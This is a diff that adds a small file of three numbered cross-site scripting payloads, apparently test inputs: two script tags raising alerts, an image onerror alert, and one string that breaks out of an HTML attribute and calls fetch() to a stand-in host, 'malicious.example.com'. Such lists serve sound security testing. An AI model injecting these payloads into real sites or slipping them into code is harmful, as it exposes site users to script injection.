@@ -1,0 +1,8 @@
+2-1.
+<script>alert('XSS1');</script>
+
+2-2.
+"><script>fetch('http://malicious.example.com');</script>
+
+2-3.
+<img src=x onerror=alert('XSS3')>
